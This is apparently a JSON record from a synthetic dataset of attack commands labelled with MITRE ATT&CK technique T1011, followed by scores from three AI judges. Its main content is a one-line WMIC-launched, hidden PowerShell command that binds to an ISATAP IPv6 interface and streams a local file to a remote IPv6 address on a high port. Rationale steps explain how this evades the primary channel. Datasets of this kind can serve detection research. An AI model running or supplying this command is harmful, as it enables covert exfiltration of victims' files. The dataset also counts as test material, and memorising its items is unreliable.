{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*ISATAP*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:1::30'); `$c.Connect(`$rv6,58222); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\media.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "explanation": "Uses WMIC to execute PowerShell that binds to an ISATAP IPv6 interface, then exfiltrates data over IPv6 to a non-standard port. This leverages an IPv6 transition mechanism as an alternate network medium per T1011.",
  "rationale_steps": [
    "Discover ISATAP adapter and collect an IPv6 address.",
    "Bind an IPv6 TCP client to the ISATAP address.",
    "Connect to an external IPv6 endpoint over a high port.",
    "Send file contents using the ISATAP path, distinct from the primary channel.",
    "Avoid permanent system configuration changes."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-987933e0-27222a53",
  "source_prompt_hash": "987933e0",
  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The WMIC call and embedded PowerShell are well-formed with balanced quoting/parentheses, valid cmdlets, and proper separators, making the command parseable as a single line.",
        "semantic_score": 3,
        "semantic_justification": "It exfiltrates a file over IPv6 via an ISATAP-bound TCP client as described, but this aligns more with exfiltration over an alternative protocol/channel than T1011's different network medium and uses a documentation-only IPv6 address, reducing operational realism.",
        "combined_score": 4.0,
        "confidence": 0.8,
        "timestamp": "2025-10-01T01:22:51.408978Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, parentheses, and braces, correct PowerShell syntax with appropriate escape sequences, and valid WMIC process call create syntax.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly aligns with T1011 by identifying an ISATAP IPv6 tunnel interface and using it as an alternate network medium to exfiltrate a file over IPv6 to a remote server on a non-standard port, bypassing potential IPv4 monitoring.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T01:22:57.659668Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 2,
        "syntactic_justification": "The backtick escaping of '$' characters (e.g., `$ifc`, `$_.IPEnabled`) within the PowerShell `-Command` string prevents PowerShell from correctly recognizing and using variables, leading to script failure.",
        "semantic_score": 5,
        "semantic_justification": "Assuming the syntactic error with backtick escaping is corrected, the command's logic perfectly aligns with the claimed intent to exfiltrate data over an ISATAP IPv6 interface, demonstrating T1011 by leveraging an alternate network medium.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-01T06:30:16.177254Z"
      }
    ],
    "llm_average_syntactic": 4.0,
    "llm_average_semantic": 4.333,
    "llm_average_score": 4.167,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
